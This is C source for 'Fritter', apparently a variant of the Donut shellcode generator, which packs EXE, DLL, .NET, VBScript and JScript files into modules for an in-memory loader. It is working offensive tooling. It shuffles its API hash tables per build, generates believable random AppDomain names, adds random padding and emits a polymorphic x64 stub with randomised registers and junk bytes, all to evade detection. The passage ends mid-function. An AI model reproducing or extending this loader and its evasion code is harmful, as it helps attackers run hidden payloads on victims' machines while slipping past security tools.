/**
  BSD 3-Clause License

  Copyright (c) 2019-2020, TheWover, Odzhan. All rights reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are met:

  * Redistributions of source code must retain the above copyright notice, this
    list of conditions and the following disclaimer.

  * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

  * Neither the name of the copyright holder nor the names of its
    contributors may be used to endorse or promote products derived from
    this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include "fritter.h"

#include "loader_peb1_exe_x64.h"
#include "loader_peb2_exe_x64.h"
#include "dispatch_shim_exe_x64.h"
/* Function-granular dispatch companion tables, emitted by exe2h alongside
   the blob headers above. Consumed only under N>1 dispatch mode. */
#include "loader_peb1_fn_table_x64.h"
#include "loader_peb1_ref_table_x64.h"
#include "loader_peb2_fn_table_x64.h"
#include "loader_peb2_ref_table_x64.h"
  
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
 
// required for each API used by the loader
// DLLs the loader loads before resolving, by payload type. A DLL is only
// loaded (and its API only resolved) for the payload types that call it;
// kernel32, kernelbase and ntdll are in every process.
#define DLL_NAMES_NET    "oleaut32;mscoree;shell32"
#define DLL_NAMES_SCRIPT "ole32;oleaut32"
#define DLL_NAMES_NATIVE ""
#define DLL_NAMES_ALL    "ole32;oleaut32;mscoree;shell32"
 
// These must be in the same order as the FRITTER_INSTANCE structure defined in fritter.h
// Order is generated per build by tools/gen_api_shuffle into
// include/api_shuffle.h from the canonical list in include/api_master.h.
// Slot 0 is pinned as LoadLibraryA (loader.c resolves it explicitly
// before the DLL-loading loop). Both this table and the typed-struct
// view in fritter.h expand from the same shuffled list, so they
// cannot disagree.
static API_IMPORT api_imports[] = {
  #define XAPI(dll, name, type, field) {dll, name},
  #include "api_shuffle.h"
  #undef XAPI
  { NULL, NULL }   // sentinel
};

// Fails the build when the API list outgrows the instance: 64 hash/address
// slots, and the loader tracks resolved slots in one 64-bit word.
// is `name` one of the semi-colon separated names in `list`?
static int dll_listed(const char *list, const char *name) {
    size_t n = strlen(name);
    while(*list) {
      size_t l = strcspn(list, ";");
      if(l == n && memcmp(list, name, n) == 0) return 1;
      list += l + (list[l] == ';');
    }
    return 0;
}

typedef char api_table_fits_instance[
  (sizeof(api_imports) / sizeof(api_imports[0]) - 1 <=
   sizeof(((PFRITTER_INSTANCE)0)->api.hash) / sizeof(((PFRITTER_INSTANCE)0)->api.hash[0]) &&
   sizeof(((PFRITTER_INSTANCE)0)->api.hash) / sizeof(((PFRITTER_INSTANCE)0)->api.hash[0]) <= 64) ? 1 : -1];

// required to load .NET assemblies
static GUID xCLSID_CorRuntimeHost = {
  0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xIID_ICorRuntimeHost = {
  0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

static GUID xCLSID_CLRMetaHost = {
  0x9280188d, 0xe8e, 0x4867, {0xb3, 0xc, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
  
static GUID xIID_ICLRMetaHost = {
  0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
  
static GUID xIID_ICLRRuntimeInfo = {
  0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};

static GUID xIID_AppDomain = {
  0x05F696DC, 0x2B29, 0x3663, {0xAD, 0x8B, 0xC4,0x38, 0x9C, 0xF2, 0xA7, 0x13}};
  
// required to load VBS and JS files
static GUID xIID_IUnknown = {
  0x00000000, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IDispatch = {
  0x00020400, 0x0000, 0x0000, {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};

static GUID xIID_IHost  = { 
  0x91afbd1b, 0x5feb, 0x43f5, {0xb0, 0x28, 0xe2, 0xca, 0x96, 0x06, 0x17, 0xec}};
  
static GUID xIID_IActiveScript = {
  0xbb1a2ae1, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSite = {
  0xdb01a1e3, 0xa42b, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptSiteWindow = {
  0xd10f6761, 0x83e9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};
  
static GUID xIID_IActiveScriptParse32 = {
  0xbb1a2ae2, 0xa4f9, 0x11cf, {0x8f, 0x20, 0x00, 0x80, 0x5f, 0x2c, 0xd0, 0x64}};

static GUID xIID_IActiveScriptParse64 = {
  0xc7ef7658, 0xe1ee, 0x480e, {0x97, 0xea, 0xd5, 0x2c, 0xb4, 0xd7, 0x6d, 0x17}};

static GUID xCLSID_VBScript = {
  0xB54F3741, 0x5B07, 0x11cf, {0xA4, 0xB0, 0x00, 0xAA, 0x00, 0x4A, 0x55, 0xE8}};

static GUID xCLSID_JScript  = {
  0xF414C260, 0x6AC0, 0x11CF, {0xB6, 0xD1, 0x00, 0xAA, 0x00, 0xBB, 0xBB, 0x58}};

// where to store information about input file
file_info fi;

// return pointer to DOS header
static PIMAGE_DOS_HEADER DosHdr(void *map) {
    return (PIMAGE_DOS_HEADER)map;
}

// return pointer to NT headers
static PIMAGE_NT_HEADERS NtHdr (void *map) {
    return (PIMAGE_NT_HEADERS) ((uint8_t*)map + DosHdr(map)->e_lfanew);
}

// return pointer to File header
static PIMAGE_FILE_HEADER FileHdr (void *map) {
    return &NtHdr(map)->FileHeader;
}

// determines CPU architecture of binary
static int is32 (void *map) {
    return FileHdr(map)->Machine == IMAGE_FILE_MACHINE_I386;
}

// return pointer to Optional header
static void* OptHdr (void *map) {
    return (void*)&NtHdr(map)->OptionalHeader;
}

static PIMAGE_DATA_DIRECTORY Dirs (void *map) {
    if (is32(map)) {
      return ((PIMAGE_OPTIONAL_HEADER32)OptHdr(map))->DataDirectory;
    } else {
      return ((PIMAGE_OPTIONAL_HEADER64)OptHdr(map))->DataDirectory;
    }
}

// Validate that every header the generator reads lies inside the file:
// DOS header, NT headers, optional header, section table, and the raw
// data range of each section. Must pass before NtHdr/Dirs/rva2ofs are used.
static int pe_bounds_ok (void *map, uint32_t len) {
    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)map;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
    uint64_t              lfanew, opt_off, opt_end, sec_end, min_opt;
    uint16_t              magic;
    DWORD                 i;

    if (len < sizeof(IMAGE_DOS_HEADER)) return 0;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    if (dos->e_lfanew <= 0) return 0;

    lfanew  = (uint64_t)dos->e_lfanew;
    opt_off = lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER);
    if (opt_off + sizeof(uint16_t) > len) return 0;

    nt = (PIMAGE_NT_HEADERS)((uint8_t*)map + lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    opt_end = opt_off + nt->FileHeader.SizeOfOptionalHeader;
    if (opt_end > len) return 0;

    memcpy(&magic, (uint8_t*)map + opt_off, sizeof(magic));
    if (magic == 0x20B)      min_opt = sizeof(IMAGE_OPTIONAL_HEADER64);
    else if (magic == 0x10B) min_opt = sizeof(IMAGE_OPTIONAL_HEADER32);
    else return 0;
    if (nt->FileHeader.SizeOfOptionalHeader < min_opt) return 0;

    sec_end = opt_end + (uint64_t)nt->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
    if (nt->FileHeader.NumberOfSections == 0 || sec_end > len) return 0;

    sh = (PIMAGE_SECTION_HEADER)((uint8_t*)map + opt_end);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
      if (sh[i].SizeOfRawData == 0) continue;
      if ((uint64_t)sh[i].PointerToRawData + sh[i].SizeOfRawData > len) return 0;
    }
    return 1;
}

static ULONG64 rva2ofs (void *base, ULONG64 rva) {
    DWORD                 i;
    ULONG64               ofs;
    PIMAGE_DOS_HEADER     dos;
    PIMAGE_NT_HEADERS     nt;
    PIMAGE_SECTION_HEADER sh;
      
    dos = (PIMAGE_DOS_HEADER)base;
    nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    sh  = (PIMAGE_SECTION_HEADER)
      ((PBYTE)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    
    for (i=0; i<nt->FileHeader.NumberOfSections; i++) {      
      if ((rva >= sh[i].VirtualAddress) && 
          (rva < (sh[i].VirtualAddress + sh[i].SizeOfRawData))) {
          
        ofs = sh[i].PointerToRawData + (rva - sh[i].VirtualAddress);
        return ofs;
      }
    }
    return -1;
}

// Translate an RVA to a pointer into the mapped file, or NULL unless
// `need` bytes starting there are inside the file. Requires pe_bounds_ok.
static uint8_t *pe_ptr (void *base, uint32_t len, ULONG64 rva, uint64_t need) {
    ULONG64 ofs = rva2ofs(base, rva);

    if (ofs == (ULONG64)-1) return NULL;
    if (ofs > len || need > (uint64_t)len - ofs) return NULL;
    return (uint8_t*)base + ofs;
}

#ifdef WINDOWS
#include "mmap-windows.c"
#endif

/**
 * Function: map_file
 * ----------------------------
 *   Open and map the contents of file into memory.
 *   
 *   INPUT  : path = file to map
 *       
 *   OUTPUT : Fritter error code. 
 */
static int map_file(const char *path) {
    struct stat fs;

    DPRINT("Entering.");
    
    if(stat(path, &fs) != 0) {
      DPRINT("Unable to read size of file : %s", path);
      return FRITTER_ERROR_FILE_NOT_FOUND;
    }
    
    if(fs.st_size == 0) {
      DPRINT("File appears to be empty!");
      return FRITTER_ERROR_FILE_EMPTY;
    }
    
    // lengths are 32-bit throughout (module header, aPLib, instance)
    if((uint64_t)fs.st_size > 0x7FFFFFFFu) {
      DPRINT("File is too large : %s", path);
      return FRITTER_ERROR_FILE_INVALID;
    }
    
    fi.fd = open(path, O_RDONLY);
    
    if(fi.fd < 0) {
      DPRINT("Unable to open %s for reading.", path);
      fi.fd = 0;
      return FRITTER_ERROR_FILE_ACCESS;
    }
    
    fi.len = (uint32_t)fs.st_size;
    
    fi.data = mmap(NULL, fi.len, PROT_READ, MAP_PRIVATE, fi.fd, 0);
    
    // no mapping? close file. mmap reports failure as MAP_FAILED, not NULL.
    if(fi.data == NULL || fi.data == (uint8_t*)MAP_FAILED) {
      DPRINT("Unable to map file : %s", path);
      fi.data = NULL;
      close(fi.fd);
      fi.fd = 0;
      return FRITTER_ERROR_NO_MEMORY;
    }
    return FRITTER_ERROR_OK;
}

/**
 * Function: unmap_file
 * ----------------------------
 *   Releases memory allocated for file and closes descriptor.
 *
 *   INPUT  : Nothing
 *
 *   OUTPUT : Fritter error code
 */
static int unmap_file(void) {
    
    if(fi.zdata != NULL) {
      DPRINT("Releasing compressed data.");
      free(fi.zdata);
      fi.zdata = NULL;
    }
    if(fi.data != NULL) {
      DPRINT("Unmapping input file.");
      munmap(fi.data, fi.len);    
      fi.data = NULL;
    }
    if(fi.fd != 0) {
      DPRINT("Closing input file.");
      close(fi.fd);
      fi.fd = 0;
    }
    return FRITTER_ERROR_OK;
}

// only included for executable generator or debug build
#if defined(FRITTER_EXE) || defined(DEBUG)
/**
 * Function: file_diff
 * ----------------------------
 *   Calculates the ratio between two lengths for compression and decompression.
 *
 *   INPUT  : new_len = new length
 *          : old_len = old length
 *
 *   OUTPUT : ratio as a percentage
 */
static uint32_t file_diff(uint32_t new_len, uint32_t old_len) {
    if (new_len <= UINT_MAX / 100) {
      new_len *= 100;
    } else {
      old_len /= 100;
    }
    if (old_len == 0) {
      old_len = 1;
    }
    return (100 - (new_len / old_len));
}
#endif

/**
 * Function: compress_file
 * ----------------------------
 *   Compresses the input file based on engine selected by user
 *
 *   INPUT  : Pointer to Fritter configuration.
 *
 *   OUTPUT : Fritter error code. 
 */
int compress_file(PFRITTER_CONFIG c) {
    int err = FRITTER_ERROR_OK;

    DPRINT("Compressing with aPLib");
    fi.zdata = malloc(aP_max_packed_size(fi.len));
    if(fi.zdata != NULL) {
      uint8_t *workmem = malloc(aP_workmem_size(fi.len));
      if(workmem != NULL) {
        fi.zlen = aP_pack(fi.data, fi.zdata, fi.len, workmem, NULL, NULL);

        if(fi.zlen == APLIB_ERROR) err = FRITTER_ERROR_COMPRESSION;
        free(workmem);
      } else {
        free(fi.zdata);
        fi.zdata = NULL;
        err = FRITTER_ERROR_NO_MEMORY;
      }
    } else err = FRITTER_ERROR_NO_MEMORY;

    if(err == FRITTER_ERROR_OK) {
      c->zlen = fi.zlen;
      DPRINT("Original file size : %"PRId32 " | Compressed : %"PRId32, fi.len, fi.zlen);
      DPRINT("File size reduced by %"PRId32"%%", file_diff(fi.zlen, fi.len));
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

// 1 if a native x64 image really uses static thread-local storage: it
// has a TLS template and its code loads _tls_index. The loader cannot
// give such an image a TLS slot, so it would read and write whatever
// module owns slot 0 in the host. (MinGW images carry an empty 8-byte
// template without using it, hence the code scan.)
static int pe_uses_static_tls(void) {
    PIMAGE_NT_HEADERS     nt  = NtHdr(fi.data);
    PIMAGE_DATA_DIRECTORY dir = Dirs(fi.data);
    PIMAGE_SECTION_HEADER sh;
    uint8_t  *tls, *code;
    uint64_t  start, end, index, base;
    uint32_t  zero, i, n, p, idx_rva;
    int32_t   disp;

    if(dir == NULL || is32(fi.data)) return 0;
    if(dir[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0) return 0;

    // IMAGE_TLS_DIRECTORY64: start, end, index, callbacks, zero fill
    tls = pe_ptr(fi.data, fi.len, dir[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress, 40);
    if(tls == NULL) return 0;

    memcpy(&start, tls,      8);
    memcpy(&end,   tls + 8,  8);
    memcpy(&index, tls + 16, 8);
    memcpy(&zero,  tls + 32, 4);

    if(end <= start && zero == 0) return 0;

    base = ((PIMAGE_NT_HEADERS64)nt)->OptionalHeader.ImageBase;
    if(index < base || index - base > 0xFFFFFFFFu) return 0;
    idx_rva = (uint32_t)(index - base);

    sh = (PIMAGE_SECTION_HEADER)((uint8_t*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);

    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(!(sh[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) continue;

      n = sh[i].SizeOfRawData;
      if(sh[i].Misc.VirtualSize != 0 && sh[i].Misc.VirtualSize < n) n = sh[i].Misc.VirtualSize;
      if(n < 5) continue;
      code = fi.data + sh[i].PointerToRawData;

      // look for a RIP-relative operand ([rip+disp32]) that resolves to _tls_index
      for(p=1; p + 4 <= n; p++) {
        if((code[p-1] & 0xC7) != 0x05) continue;
        memcpy(&disp, code + p, 4);
        if((uint32_t)(sh[i].VirtualAddress + p + 4 + disp) == idx_rva) return 1;
      }
    }
    return 0;
}

/**
 * Function: read_file_info
 * ----------------------------
 *   Reads information about the input file.
 *
 *   INPUT  : Pointer to Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int read_file_info(PFRITTER_CONFIG c) {
    PIMAGE_NT_HEADERS                nt;    
    PIMAGE_DATA_DIRECTORY            dir;
    PMDSTORAGESIGNATURE              pss;
    PIMAGE_COR20_HEADER              cor;
    DWORD                            dll, rva, cpu;
    PCHAR                            ext;
    int                              err = FRITTER_ERROR_OK;

    DPRINT("Entering.");
    
    // invalid parameters passed?
    if(c->input[0] == 0) {
      DPRINT("No input file provided.");
      return FRITTER_ERROR_INVALID_PARAMETER;
    }

    DPRINT("Checking extension of %s", c->input);
    ext = strrchr(c->input, '.');
    
    // no extension? exit
    if(ext == NULL) {
      DPRINT("Input file has no extension.");
      return FRITTER_ERROR_FILE_INVALID;
    }
    DPRINT("Extension is \"%s\"", ext);

    // VBScript?
    if (strcasecmp(ext, ".vbs") == 0) {
      DPRINT("File is VBS");
      fi.type = FRITTER_MODULE_VBS;
      fi.arch = FRITTER_ARCH_X64;
    } else 
    // JScript?
    if (strcasecmp(ext,  ".js") == 0) {
      DPRINT("File is JS");
      fi.type = FRITTER_MODULE_JS;
      fi.arch = FRITTER_ARCH_X64;
    } else 
    // EXE?
    if (strcasecmp(ext, ".exe") == 0) {
      DPRINT("File is EXE");
      fi.type = FRITTER_MODULE_EXE;
    } else
    // DLL?
    if (strcasecmp(ext, ".dll") == 0) {
      DPRINT("File is DLL");
      fi.type = FRITTER_MODULE_DLL;
    } else {
      DPRINT("Don't recognize file extension.");
      return FRITTER_ERROR_FILE_INVALID;
    }
    
    DPRINT("Mapping %s into memory", c->input);
    
    err = map_file(c->input);
    if(err != FRITTER_ERROR_OK) return err;
    
    // file is EXE or DLL?
    if(fi.type == FRITTER_MODULE_DLL ||
       fi.type == FRITTER_MODULE_EXE)
    {
      if(!pe_bounds_ok(fi.data, fi.len)) {
        DPRINT("EXE/DLL headers are invalid or extend past the end of the file.");
        err = FRITTER_ERROR_FILE_INVALID;
        goto cleanup;
      }

      dir = Dirs(fi.data);
      
      if(dir == NULL) {
        DPRINT("EXE/DLL has no valid image directories.");
        err = FRITTER_ERROR_FILE_INVALID;
        goto cleanup;
      }
      DPRINT("Checking characteristics");
      
      nt  = NtHdr(fi.data);
      dll = nt->FileHeader.Characteristics & IMAGE_FILE_DLL;
      cpu = is32(fi.data);
      rva = dir[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress;
      
      // set the CPU architecture for file
      fi.arch = cpu ? 1 /* x86 - unsupported */ : FRITTER_ARCH_X64;
      
      // if COM directory present
      if(rva != 0) {
        DPRINT("COM Directory found indicates .NET assembly.");
        
        // if it has an export address table, we assume it's a .NET
        // mixed assembly. curently unsupported by the PE loader.
        if(dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress != 0) {
          DPRINT("File looks like a mixed (native and managed) assembly.");
          err = FRITTER_ERROR_MIXED_ASSEMBLY;
          goto cleanup;
        } else {
          // set type to EXE or DLL assembly
          fi.type = (dll) ? FRITTER_MODULE_NET_DLL : FRITTER_MODULE_NET_EXE;
          
          // try read the runtime version from meta header
          strncpy(fi.ver, "v4.0.30319", FRITTER_VER_LEN - 1);
          
          cor = (PIMAGE_COR20_HEADER)pe_ptr(fi.data, fi.len, rva, sizeof(IMAGE_COR20_HEADER));
          if (cor != NULL) {
            rva = cor->MetaData.VirtualAddress;
            if(rva != 0) {
              pss = (PMDSTORAGESIGNATURE)pe_ptr(fi.data, fi.len, rva, sizeof(MDSTORAGESIGNATURE));
              // the version string must lie inside the file as well
              if(pss != NULL && pss->iVersionString != 0 &&
                 pe_ptr(fi.data, fi.len, rva,
                        sizeof(MDSTORAGESIGNATURE) + (uint64_t)pss->iVersionString) != NULL)
              {
                uint32_t n = pss->iVersionString;
                if(n > FRITTER_VER_LEN - 1) n = FRITTER_VER_LEN - 1;
                memset(fi.ver, 0, sizeof(fi.ver));
                memcpy(fi.ver, pss->pVersion, n);
                DPRINT("Runtime version : %s", fi.ver);
              }
            }
          }
        }
      } else if(!c->allow_tls && c->tls_donor[0] == 0 && pe_uses_static_tls()) {
        DPRINT("File uses static thread-local storage.");
        err = FRITTER_ERROR_STATIC_TLS;
        goto cleanup;
      }
    }
    // assign length of file and type to configuration
    c->len      = fi.len;
    c->mod_type = fi.type;
cleanup:
    if(err != FRITTER_ERROR_OK) {
      DPRINT("Unmapping input file due to errors.");
      unmap_file();
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

/**
 * Function: gen_random
 * ----------------------------
 *   Generates pseudo-random bytes.
 *
 *   INPUT  : buf = where to store random bytes.
 *          : len = length of random bytes to generate.
 *
 *   OUTPUT : 1 if ok, else 0
 */
// Set when any gen_random() call fails. Most call sites draw layout or
// junk choices and do not check the result individually; FritterCreate
// checks this once and refuses to emit output built from bad randomness.
static int g_rng_failed = 0;

static int gen_random(void *buf, uint64_t len) {
#if defined(WINDOWS)
    HCRYPTPROV prov;
    int        ok;
    
    // 1. acquire crypto context
    if(!CryptAcquireContext(
        &prov, NULL, NULL,
        PROV_RSA_FULL,
        CRYPT_VERIFYCONTEXT | CRYPT_SILENT)) {
      g_rng_failed = 1;
      return 0;
    }

    ok = (int)CryptGenRandom(prov, (DWORD)len, buf);
    CryptReleaseContext(prov, 0);
    
    if(!ok) g_rng_failed = 1;
    return ok;
#else
    int      fd;
    uint64_t r=0;
    uint8_t  *p=(uint8_t*)buf;

    DPRINT("Opening /dev/urandom to acquire %li bytes", len);
    fd = open("/dev/urandom", O_RDONLY);

    if(fd >= 0) {
      while(r < len) {
        ssize_t n = read(fd, p + r, (size_t)(len - r));
        if(n <= 0) break;
        r += (uint64_t)n;
      }
      close(fd);
    }
    DPRINT("Acquired %li of %li bytes requested", r, len);
    if(r != len) g_rng_failed = 1;
    return r == len;
#endif
}

/**
 * Function: gen_random_string
 * ----------------------------
 *   Generates a pseudo-random string
 *
 *   INPUT  : output = pointer to buffer that receives string
 *          : len = length of string to generate
 *
 *   OUTPUT : 1 if ok, else 0  
 */
// A name that reads like one somebody chose: two to four syllables,
// capitalised, 4 to 12 letters.
static int gen_domain_name(char *out) {
    static const char cons[] = "bcdfglmnprstv", vow[] = "aeiou", tail[] = "lmnrst";
    uint8_t r[16];
    int     i, k = 0, n;

    if(!gen_random(r, sizeof(r))) return 0;
    n = 2 + (r[0] % 3);
    for(i = 0; i < n; i++) {
      out[k++] = cons[r[1 + i] % 13];
      out[k++] = vow[r[5 + i] % 5];
      if(r[9 + i] & 1) out[k++] = tail[(r[9 + i] >> 1) % 6];
    }
    out[0] = (char)(out[0] - 32);
    out[k] = 0;
    return 1;
}

static int gen_random_string(void *output, uint64_t len) {
    uint8_t rnd[FRITTER_MAX_NAME];
    int     i;
    char    tbl[]="HMN34P67R9TWCXYF";  // https://stackoverflow.com/a/27459196
    char    *str = (char*)output;
    
    if(len == 0 || len > (FRITTER_MAX_NAME - 1)) return 0;
    
    // generate FRITTER_MAX_NAME random bytes
    if(!gen_random(rnd, FRITTER_MAX_NAME)) return 0;
    
    // generate a string using unambiguous characters
    for(i=0; i<len; i++) {
      str[i] = tbl[rnd[i] % (sizeof(tbl) - 1)];
    }
    str[i] = 0;
    return 1;
}

/**
 * Function: build_module
 * ----------------------------
 *   Create a Fritter module from Fritter configuration
 *
 *   INPUT  : A pointer to a fritter configuration
 *
 *   OUTPUT : Fritter error code. 
 */
static int build_module(PFRITTER_CONFIG c) {
    PFRITTER_MODULE mod     = NULL;
    uint32_t      mod_len, data_len;
    void          *data;
    int           err = FRITTER_ERROR_OK;
    
    DPRINT("Entering.");
    
    // Compress the input file with aPLib
    err = compress_file(c);

    if(err != FRITTER_ERROR_OK) {
      DPRINT("compress_file() failed");
      return err;
    }
    DPRINT("Assigning %"PRIi32 " bytes of %p to data", fi.zlen, fi.zdata);
    data     = fi.zdata;
    data_len = fi.zlen;

    // Generate random padding length for module data (0-255 bytes)
    uint8_t mod_pad_len = 0;
    gen_random(&mod_pad_len, 1);
    DPRINT("Module data padding: %d bytes", mod_pad_len);

    // Allocate memory for module information and contents of file
    mod_len = data_len + (uint32_t)mod_pad_len + sizeof(FRITTER_MODULE);
    
    DPRINT("Allocating %" PRIi32 " bytes of memory for FRITTER_MODULE", mod_len);
    mod = calloc(mod_len, 1);

    // Memory not allocated? exit
    if(mod == NULL) {
      DPRINT("calloc() failed");
      return FRITTER_ERROR_NO_MEMORY;
    }
    
    // Set the module info
    mod->type     = fi.type;
    mod->thread   = c->thread;
    mod->compress = FRITTER_COMPRESS_APLIB;
    mod->unicode  = c->unicode;
    mod->imgbase  = c->imgbase;
    mod->zlen     = fi.zlen;
    mod->len      = fi.len;
    mod->sum      = mod_sum(fi.data, fi.len);
    
    // DotNet assembly?
    if(mod->type == FRITTER_MODULE_NET_DLL ||
       mod->type == FRITTER_MODULE_NET_EXE)
    {
      // If no domain name specified in configuration
      if(c->domain[0] == 0) {
        // if entropy is enabled
        if(c->entropy != FRITTER_ENTROPY_NONE) { 
          // generate a random name
          if(!gen_domain_name(c->domain)) {
            DPRINT("gen_random_string() failed");
            err = FRITTER_ERROR_RANDOM;
            goto cleanup;
          }
        }
      }
      DPRINT("Domain  : %s", c->domain[0] == 0 ? "Default" : c->domain);
      if(c->domain[0] != 0) {
        // Set the domain name in module
        strncpy(mod->domain, c->domain, FRITTER_MAX_NAME-1);
      } else {
        memset(mod->domain, 0, FRITTER_DOMAIN_LEN);
      }
      // Assembly is DLL? Copy the class and method
      if(mod->type == FRITTER_MODULE_NET_DLL) {
        DPRINT("Class   : %s", c->cls);
        strncpy(mod->cls, c->cls, FRITTER_MAX_NAME-1);
        
        DPRINT("Method  : %s", c->method);
        strncpy(mod->method, c->method, FRITTER_MAX_NAME-1);
      }
      // If no runtime specified in configuration, use version from assembly
      if(c->runtime[0] == 0) {
        strncpy(c->runtime, fi.ver, FRITTER_MAX_NAME-1);
      }
      DPRINT("Runtime : %s", c->runtime);
      strncpy(mod->runtime, c->runtime, FRITTER_MAX_NAME-1);
    } else
    // Unmanaged DLL? copy function name to module          
    if(mod->type == FRITTER_MODULE_DLL && c->method[0] != 0) {
      DPRINT("DLL function : %s", c->method);
      strncpy(mod->method, c->method, FRITTER_MAX_NAME-1);
    }
      
    // Parameters specified?
    if(c->args[0] != 0) {
      // If file type is unmanaged EXE
      if(mod->type == FRITTER_MODULE_EXE) {
        // If entropy is disabled
        if(c->entropy == FRITTER_ENTROPY_NONE) {
          // Set to "AAAA"
          memset(mod->args, 'A', 4);
        } else {
          // Generate 4-byte random name
          if(!gen_random_string(mod->args, 4)) {
            DPRINT("gen_random_string() failed");
            err = FRITTER_ERROR_RANDOM;
            goto cleanup;
          }
        }
        // Add space
        mod->args[4] = ' ';
      }
      // 
      // Copy parameters 
      strncat(mod->args, c->args, FRITTER_MAX_NAME-6);
    }    
    DPRINT("Copying data to module");
    
    memcpy(&mod->data, data, data_len);
    // Fill padding after compressed data with random bytes
    if(mod_pad_len > 0) {
      gen_random((uint8_t*)&mod->data + data_len, mod_pad_len);
    }
    // update configuration with pointer to module
    c->mod     = mod;
    c->mod_len = mod_len;
cleanup:
    // if there was an error, free memory for module
    if(err != FRITTER_ERROR_OK) {
      DPRINT("Releasing memory due to errors.");
      free(mod);
    }
    DPRINT("Leaving with error :  %" PRId32, err);
    return err;
}

static uint32_t emit_rnd_nop(uint8_t *out, uint32_t len);

// op dst, src for two 64-bit registers (0x89 mov, 0x29 sub, 0x01 add, 0x31 xor, 0x39 cmp)
static uint8_t *x_rr(uint8_t *p, uint8_t op, uint8_t dst, uint8_t src) {
    *p++ = 0x48 | ((src >> 3) << 2) | (dst >> 3);
    *p++ = op;
    *p++ = 0xC0 | ((src & 7) << 3) | (dst & 7);
    return p;
}

// mov r64, imm64; *at receives the address of the immediate
static uint8_t *x_imm64(uint8_t *p, uint8_t r, uint8_t **at) {
    *p++ = 0x48 | (r >> 3);
    *p++ = 0xB8 | (r & 7);
    *at  = p;
    gen_random(p, 8);
    return p + 8;
}

/* Emit the stub that stands in for RtlPcToFileHeader(rcx = pc, rdx = &base)
 * inside a payload image: for an address in the image it stores and returns
 * the image base, anything else goes to the real function. The loader
 * patches three immediates (image base, image size, real function); the
 * 64-bit ones are stored xor key[] when the stub decodes them itself.
 * Registers, the form of every step, the order of the two tails and the
 * padding between instructions are drawn per build. Returns bytes written
 * (< 128). */
static uint32_t emit_pcfh_stub(uint8_t *out, uint8_t *base_off, uint8_t *size_off,
                               uint8_t *real_off, uint64_t key[2]) {
    uint8_t *p = out, *at, *jcc, rnd[16], pool[5] = {0, 8, 9, 10, 11};   // rax, r8-r11
    uint8_t A, B, T, R, T2;
    int     i, j, pass;

    gen_random(rnd, sizeof(rnd));
    for(i = 4; i > 0; i--) {
      j = rnd[i - 1] % (i + 1);
      T = pool[i]; pool[i] = pool[j]; pool[j] = T;
    }
    A = pool[0]; B = pool[1]; T = pool[2];
